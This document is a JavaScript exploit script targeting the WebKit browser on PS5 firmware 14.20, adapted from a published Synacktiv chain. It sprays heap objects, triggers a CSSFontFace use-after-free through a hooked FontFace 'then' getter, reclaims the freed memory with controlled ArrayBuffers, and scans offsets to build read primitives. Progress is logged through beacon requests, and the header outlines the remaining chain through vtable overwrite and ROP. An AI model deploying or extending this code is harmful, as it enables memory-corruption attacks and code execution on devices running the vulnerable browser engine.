// p199 — Synacktiv-style exploitation chain adapted for PS5 14.20
//
// Reference: "This Is For The Pwners" (Synacktiv, BH EU 2020)
//
// Chain: UAF → reclaim → arbitrary decrement → StringImpl.length corrupt
//        → relative read → find JSArrayBufferView → corrupt m_vector → ARW
//        → vtable overwrite → ROP
//
// PS5 advantages over PS4:
// - Gigacage DISABLED → ArrayBuffer backing stores on fastMalloc heap
// - dynlib_get_info leaks 39 module bases → userland ASLR defeated
// - libpas allocator (predictable size classes)
//
// This script implements the generic chain infrastructure.
// The UAF trigger is pluggable — use with any confirmed crash.
//
// Beacon prefix: V199-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V199-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  // ================================================================
  // 64-bit integer helpers (no BigInt dependency for older WebKit)
  // ================================================================
  function Int64(lo, hi) {
    this.lo = lo >>> 0;
    this.hi = (hi || 0) >>> 0;
  }
  Int64.prototype.add = function(n) {
    if (typeof n === 'number') {
      var lo = this.lo + n;
      var hi = this.hi + (lo > 0xFFFFFFFF ? 1 : 0);
      return new Int64(lo >>> 0, hi >>> 0);
    }
    var lo = this.lo + n.lo;
    var carry = lo > 0xFFFFFFFF ? 1 : 0;
    return new Int64(lo >>> 0, (this.hi + n.hi + carry) >>> 0);
  };
  Int64.prototype.sub = function(n) {
    if (typeof n === 'number') {
      var lo = this.lo - n;
      var hi = this.hi - (lo < 0 ? 1 : 0);
      return new Int64(lo >>> 0, hi >>> 0);
    }
    var lo = this.lo - n.lo;
    var borrow = lo < 0 ? 1 : 0;
    return new Int64(lo >>> 0, (this.hi - n.hi - borrow) >>> 0);
  };
  Int64.prototype.hex = function() {
    return '0x' + ('00000000' + this.hi.toString(16)).slice(-8) +
           ('00000000' + this.lo.toString(16)).slice(-8);
  };
  Int64.prototype.eq = function(other) {
    return this.lo === other.lo && this.hi === other.hi;
  };
  Int64.fromDataView = function(dv, offset) {
    return new Int64(dv.getUint32(offset, true), dv.getUint32(offset + 4, true));
  };
  Int64.prototype.writeToDataView = function(dv, offset) {
    dv.setUint32(offset, this.lo, true);
    dv.setUint32(offset + 4, this.hi, true);
  };

  // ================================================================
  // Phase 1: StringImpl spray + relative read infrastructure
  //
  // StringImpl layout (WebKit-1200):
  //   offset 0: m_refCount (4 bytes)
  //   offset 4: m_length (4 bytes)
  //   offset 8: m_data8 pointer (8 bytes)
  //   offset 16: m_hashAndFlags (4 bytes)
  //   offset 20+: inline data (if 8bit)
  //
  // Strategy: create many strings of known content, then try to read
  // past their bounds if we can corrupt m_length.
  // ================================================================

  var STRING_COUNT = 2000;
  var STRING_LEN = 64; // target StringImpl size class
  var strings = [];
  var stringMarker = 'SRCH'; // 4 bytes we look for in relative read

  function sprayStrings() {
    strings = [];
    for (var i = 0; i < STRING_COUNT; i++) {
      // Create strings with recognizable content
      // 'SRCH' + index + padding to fill the size class
      var s = stringMarker + ('0000' + i).slice(-4);
      while (s.length < STRING_LEN) s += 'P';
      strings.push(s);
    }
    syncB('STRINGS-' + STRING_COUNT);
  }

  // ================================================================
  // Phase 2: JSArrayBufferView spray
  //
  // We need JSArrayBufferView objects on the fastMalloc heap.
  // Object.defineProperties creates Vector<PropertyDescriptor> and
  // MarkedArgumentBuffer which store JSValue refs on fastMalloc.
  //
  // JSArrayBufferView layout (WebKit-1200, LLInt):
  //   JSCell header: 8 bytes (StructureID + flags)
  //   m_butterfly: 8 bytes
  //   m_mode (4 bytes) | m_length (4 bytes)
  //   m_vector: 8 bytes (backing store pointer)
  //   m_structure: (from JSCell)
  //
  // When Gigacage is disabled, m_vector points to regular fastMalloc heap.
  // ================================================================

  var VIEW_COUNT = 200;
  var views = [];
  var viewMarker = new ArrayBuffer(64);

  function sprayViews() {
    views = [];
    for (var i = 0; i < VIEW_COUNT; i++) {
      var ab = new ArrayBuffer(64);
      var u8 = new Uint8Array(ab);
      // Fill with marker: 0xAB + index
      u8[0] = 0xAB;
      u8[1] = (i >> 0) & 0xFF;
      u8[2] = (i >> 8) & 0xFF;
      u8[3] = 0xCD;
      views.push(new Uint32Array(ab));
    }
    syncB('VIEWS-' + VIEW_COUNT);
  }

  // Get references to views on fastMalloc through Object.defineProperties
  function leakViewRefsToHeap() {
    var props = {};
    for (var i = 0; i < views.length; i++) {
      props['p' + i] = { value: views[i], writable: true };
    }
    // Vector<PropertyDescriptor> allocated on fastMalloc
    // Contains JSValue references to our views
    try {
      Object.defineProperties({}, props);
    } catch(e) {}
    syncB('LEAKED-REFS');
  }

  // ================================================================
  // Phase 3: UAF trigger — pluggable
  //
  // The trigger function should:
  // 1. Create the vulnerable object
  // 2. Trigger the free while keeping a dangling reference
  // 3. Return the dangling reference (or null if crash)
  //
  // Currently implements the CSSFontFace thenable trick.
  // ================================================================

  function triggerCSSFontFaceUAF(spraySize, callback) {
    if (typeof FontFace === 'undefined' || !document.fonts || !document.fonts.load) {
      callback(null, 'no-fontface');
      return;
    }

    var abs = new Array(0xB0);
    var style = document.createElement('style');
    document.head.appendChild(style);

    var A;
    try {
      A = new FontFace("fa", "local(Helvetica)", { unicodeRange: "U+0041" });
      document.fonts.add(A);
    } catch(e) {
      style.remove();
      callback(null, 'err-a');
      return;
    }

    void A.loaded;

    var sprayRule = '@font-face { font-family: sp; src: local(Helvetica Bold); unicode-range: U+0043; }';
    for (var i = 0; i < 0x2C; i++) {
      try { style.sheet.insertRule(sprayRule, style.sheet.cssRules.length); } catch(x) {}
    }

    var uafRule = '@font-face { font-family: fb; src: url(NONEXIST.woff); unicode-range: U+0042; }';
    var uafIdx;
    try {
      uafIdx = style.sheet.cssRules.length;
      style.sheet.insertRule(uafRule, uafIdx);
    } catch(e) {
      style.remove();
      callback(null, 'err-b');
      return;
    }

    for (var i = 0x2C; i < 0xB0; i++) {
      try { style.sheet.insertRule(sprayRule, style.sheet.cssRules.length); } catch(x) {}
    }

    document.body.offsetTop;

    var oldThen = FontFace.prototype.then;
    var triggered = false;

    Object.defineProperty(FontFace.prototype, "then", {
      configurable: true,
      get: function() {
        if (this === A && !triggered) {
          triggered = true;
          syncB('THEN-FIRE');

          try { style.sheet.deleteRule(uafIdx); } catch(x) {}
          document.body.offsetTop;

          var rc = style.sheet.cssRules.length;
          for (var i = rc - 1; i >= 0; i--) {
            try {
              if (style.sheet.cssRules[i].cssText.indexOf('sp') !== -1) {
                style.sheet.deleteRule(i);
              }
            } catch(x) {}
          }
          document.body.offsetTop;

          // Spray to reclaim
          for (var i = 0; i < abs.length; i++) {
            var ab = new ArrayBuffer(spraySize);
            var v = new DataView(ab);
            v.setUint32(8, 1, true); // ref count = 1
            // Set status=Success at multiple candidate offsets
            for (var off = 0x70; off <= 0x160; off += 8) {
              if (off < spraySize) v.setUint8(off, 3);
            }
            abs[i] = ab;
          }
          syncB('SPRAY-DONE');
        }
        return undefined;
      }
    });

    document.fonts.load('1em fa, fb', 'AB').then(function(fonts) {
      Object.defineProperty(FontFace.prototype, "then", {
        configurable: true,
        value: oldThen
      });

      syncB('FONTS-' + fonts.length);

      if (fonts.length === 2) {
        var uafFont = null;
        for (var fi = 0; fi < fonts.length; fi++) {
          try {
            if (fonts[fi].unicodeRange === 'U+0-10FFFF') {
              uafFont = fonts[fi];
              break;
            }
          } catch(e) {}
        }

        if (uafFont) {
          syncB('UAF-GOT');

          // Find reclaimed ArrayBuffer (ref count went from 1 to 2)
          var reclaimedAB = null;
          for (var i = 0; i < abs.length; i++) {
            var v = new DataView(abs[i]);
            if (v.getUint32(8, true) === 2) {
              reclaimedAB = abs[i];
              syncB('RECLAIM-' + i);
              break;
            }
          }

          // Try reading all properties
          var propResults = {};
          var propNames = ['family', 'style', 'weight', 'stretch',
                          'unicodeRange', 'variant', 'featureSettings',
                          'variationSettings', 'display', 'status'];
          for (var pi = 0; pi < propNames.length; pi++) {
            var pn = propNames[pi];
            try {
              var val = uafFont[pn];
              propResults[pn] = String(val).substring(0, 30);
              syncB('PROP-' + pn.substring(0, 8) + '-' + propResults[pn].substring(0, 15));
            } catch(e) {
              propResults[pn] = 'ERR:' + (e.message || '').substring(0, 15);
              syncB('PROP-' + pn.substring(0, 8) + '-ERR');
            }
          }

          callback({
            font: uafFont,
            ab: reclaimedAB,
            props: propResults,
            allABs: abs
          }, 'success');
        } else {
          callback(null, 'no-uaf-font');
        }
      } else {
        callback(null, 'fonts-' + fonts.length);
      }

      try { document.fonts.delete(A); } catch(x) {}
      style.remove();

    }).catch(function(e) {
      Object.defineProperty(FontFace.prototype, "then", {
        configurable: true,
        value: oldThen
      });
      style.remove();
      callback(null, 'reject-' + (e.message || '').substring(0, 15));
    });
  }

  // ================================================================
  // Phase 4: Build primitives from successful UAF
  // ================================================================

  function buildPrimitives(uafResult) {
    if (!uafResult || !uafResult.ab) {
      syncB('NO-PRIMITIVES');
      return;
    }

    var uafView = new DataView(uafResult.ab);
    var uafFont = uafResult.font;

    syncB('BUILD-PRIMS');

    // Dump current state of reclaimed buffer
    var u8 = new Uint8Array(uafResult.ab);
    var hex = '';
    for (var j = 0; j < Math.min(128, u8.length); j++) {
      hex += ('0' + u8[j].toString(16)).slice(-2);
    }
    syncB('STATE-' + hex.substring(0, 60));
    syncB('STATE2-' + hex.substring(60, 120));
    syncB('STATE3-' + hex.substring(120, 180));
    syncB('STATE4-' + hex.substring(180, 240));

    // Try to use featureSettings as read primitive (may work on WebKit-1200)
    // This works by setting m_featureSettings.m_buffer to target address
    // and reading the property — it returns the 4-byte font feature tag at that address
    //
    // On PS5 14.20 (WebKit-1200, Safari 17.0 era), the property access path
    // goes through m_propertiesOrCSSConnection on newer builds.
    // But WebKit-1200 might still use the direct accessor.

    // Test: write known data to featureSettings buffer offset and read back
    var testOffsets = [0x28, 0x30, 0x38, 0x48, 0x58, 0x68, 0x78, 0x88, 0x98];
    for (var ti = 0; ti < testOffsets.length; ti++) {
      var off = testOffsets[ti];
      if (off + 16 >= u8.length) continue;

      // Save original
      var saved = new Uint8Array(16);
      for (var b = 0; b < 16; b++) saved[b] = u8[off + b];

      // Write test pattern: m_buffer=readable_addr, m_size=1, m_capacity=1
      // Point m_buffer to our own AB data (we know it's on the heap)
      // Actually, we need a KNOWN readable address.
      // For now, just write a recognizable tag and see if featureSettings returns it.
      u8[off] = 0x54; u8[off+1] = 0x45; u8[off+2] = 0x53; u8[off+3] = 0x54; // "TEST"
      uafView.setInt32(off + 8, 1, true); // m_size
      uafView.setInt32(off + 12, 1, true); // m_capacity

      try {
        var fs = uafFont.featureSettings;
        if (fs && fs !== 'normal' && fs !== '' && fs !== 'null') {
          syncB('FS-HIT-OFF' + off + '-' + fs.substring(0, 20));
        }
      } catch(e) {}

      // Restore
      for (var b = 0; b < 16; b++) u8[off + b] = saved[b];
    }

    // Also try other property accessors that might read from controlled offsets
    // family, style, weight, etc. each read from different CSSFontFace fields
    // If we can find which offset they read from, we have a read primitive

    // Scan: for each property, try changing bytes at each offset and see if the
    // property value changes
    var props = ['family', 'style', 'weight', 'stretch', 'display'];
    for (var pi = 0; pi < props.length; pi++) {
      var pn = props[pi];
      try {
        var baseline = String(uafFont[pn]);
        // Try flipping bytes to find which offset this property reads from
        for (var scanOff = 0; scanOff < Math.min(u8.length, 256); scanOff += 8) {
          var origByte = u8[scanOff];
          u8[scanOff] = origByte ^ 0xFF;
          try {
            var changed = String(uafFont[pn]);
            if (changed !== baseline) {
              syncB('SCAN-' + pn.substring(0, 6) + '-OFF' + scanOff + '-CHG');
            }
          } catch(e) {
            syncB('SCAN-' + pn.substring(0, 6) + '-OFF' + scanOff + '-CRASH');
          }
          u8[scanOff] = origByte;
        }
      } catch(e) {
        // Property access itself crashes — the offset 0 flip probably corrupted vtable
      }
    }

    syncB('PRIMS-DONE');
  }

  // ================================================================
  // Main: run the exploitation chain
  // ================================================================

  syncB('PHASE1-STRINGS');
  sprayStrings();

  syncB('PHASE2-VIEWS');
  sprayViews();
  leakViewRefsToHeap();

  // Try CSSFontFace UAF at multiple sizes
  var sizes = [256, 288, 320, 352, 384, 192, 224, 160, 128];
  var sizeIdx = 0;

  function tryNextSize() {
    if (sizeIdx >= sizes.length) {
      syncB('ALL-SIZES-TRIED');
      return;
    }

    var sz = sizes[sizeIdx];
    sizeIdx++;
    syncB('TRY-SZ' + sz);

    triggerCSSFontFaceUAF(sz, function(result, status) {
      syncB('RESULT-SZ' + sz + '-' + status);

      if (result && status === 'success') {
        syncB('SUCCESS-SZ' + sz);
        buildPrimitives(result);
        // Don't try more sizes — we got it
        syncB('CHAIN-COMPLETE');
      } else {
        // Try next size
        setTimeout(tryNextSize, 200);
      }
    });
  }

  syncB('START-UAF');
  tryNextSize();

  setTimeout(function() {
    syncB('TIMEOUT');
  }, 120000);

})();
